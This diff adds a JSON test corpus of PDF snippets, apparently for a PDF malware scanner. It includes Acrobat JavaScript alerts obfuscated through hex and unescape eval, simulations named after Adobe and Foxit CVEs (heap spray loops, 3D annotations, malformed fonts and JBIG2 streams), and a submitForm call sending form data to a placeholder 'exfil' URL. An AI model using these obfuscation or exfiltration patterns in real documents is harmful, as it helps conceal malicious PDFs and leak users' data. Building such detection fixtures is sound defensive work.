@@ -1,0 +1,30 @@
+{
+  "js_classic": {
+    "simple_alert": "app.alert(\"Test PDF - variant simple\");",
+    "obf1_concat": "\"app\" + \".\" + \"al\" + \"ert\" + \"(\" + '\"Test obf 1\"' + \");\"",
+    "obf2_hex": "var s=\"6170702e616c657274282254657374206e69766561752032206f62667573636174656422293b\"; var r=\"\"; for(var i=0;i<s.length;i+=2){r+=String.fromCharCode(parseInt(s.substr(i,2),16));} eval(r);",
+    "obf3_unescape": "eval(unescape(\"%u0061%u0070%u0070%u002e%u0061%u006c%u0065%u0072%u0074%u0028%u0022%u0054%u0065%u0073%u0074%u0020%u6e69%u7665%u6175%u2033%u0022%u0029%u003b\"));",
+    "uri_submit": "this.submitForm({cURL:\"https://example.invalid/track\",cSubmitAs:\"HTML\"});",
+    "launch_url": "app.launchURL(\"https://example.invalid\",true);"
+  },
+
+  "js_cve": {
+    "uaf_basic": "var arr = []; for(var i=0; i<1000; i++) { arr[i] = new ArrayBuffer(0x100); } delete arr[500]; arr[500] = null; app.alert(\"CVE-style UaF simulation - harmless\");",
+    "resetform_corrupt": "var f = this.getField(\"dummy\"); if (f) f.value = \"overflow attempt\"; this.resetForm([\"dummy\"]); app.alert(\"resetForm pattern - CVE-2023-21608 like\");",
+    "submitform": "this.submitForm({ cURL: \"https://example.invalid/exfil?sim=cve2020\", cSubmitAs: \"HTML\", cCharset: \"utf-8\" });",
+    "font_spray": "var spray = []; for (var i = 0; i < 500; i++) { spray[i] = new Uint8Array(0x400); } app.alert(\"Font spray pattern - CVE-2023-26369 sim\");",
+    "3d_annot": "var annot = this.addAnnot({page:0, type:\"3D\"}); annot.setProps({3DData:\"fake U3D marker for CVE sim\"}); app.alert(\"3D annotation trigger sim - Foxit PRC style\");",
+    "v8_old": "var buf = new BigUint32Array(100); buf[0] = 0xdeadbeef; eval(\"app.alert('Old V8 pattern - Foxit 2020 CVE sim')\");",
+    "annot_reply": "var note = this.addAnnot({page:0, type:\"Text\"}); note.replyTo = \"malformed reply chain sim\"; app.alert(\"Annotation reply corruption sim - Foxit 2024\");"
+  },
+
+  "non_js": {
+    "ttf_oob": "/Font << /F1 << /Subtype /TrueType /BaseFont /Helvetica /FontDescriptor << /FontFile2 999 0 R >> >>\\n/FontFile2 << /Length 100 /Filter /FlateDecode >>  % simulated malformed TTF header\\nstream\\n( fake TTF data with bad length / OOB potential - CVE-2023-26369 like )\\nendstream",
+    "jbig2_heap": "/XObject << /Im1 << /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray /BitsPerComponent 1\\n/Filter /JBIG2Decode /DecodeParms << /JBIG2Globals 998 0 R >> >>\\n/JBIG2Globals << /Length 50 >> stream\\n( malformed JBIG2 segment - potential int overflow / heap corruption sim )\\nendstream >>",
+    "prc_u3d": "/Annots [ << /Type /Annot /Subtype /3D /3DA << /A 3DView >> /3DData << /Subtype /U3D /Length 200 >>\\nstream\\n( fake U3D/PRC data - bad bounds check sim - CVE-2025 PRC OOB style )\\nendstream >> ]",
+    "multi_filter": "/Contents << /Length 150 /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /DCTDecode ] >>\\nstream\\nH)YQ)dT?)5+ garbage multi-filter stream for OOB sim ... endstream",
+    "xfa_corrupt": "/AcroForm << /XFA [ (datasets) (template malformed cycle) ] /Fields [ << /T (field1) /Kids [ << /T (cycle) /Kids [...] >> ] >> ] >>",
+    "embedded_suspect": "/Names << /EmbeddedFiles << /Names [ (fake_malware.exe) << /F (embedded) /EF << /F 997 0 R >> >> ] >>\\n/F << /Type /EmbeddedFile /Subtype /application#2Foctet-stream /Length 10 >> stream\\n( innocent ) endstream",
+    "ocg_spoof": "/OCProperties << /OCGs [ << /Name (HiddenLayer) /Usage << /ExportState /OFF >> >> >>\\n% runtime state not signed - spoof sim"
+  }
+}
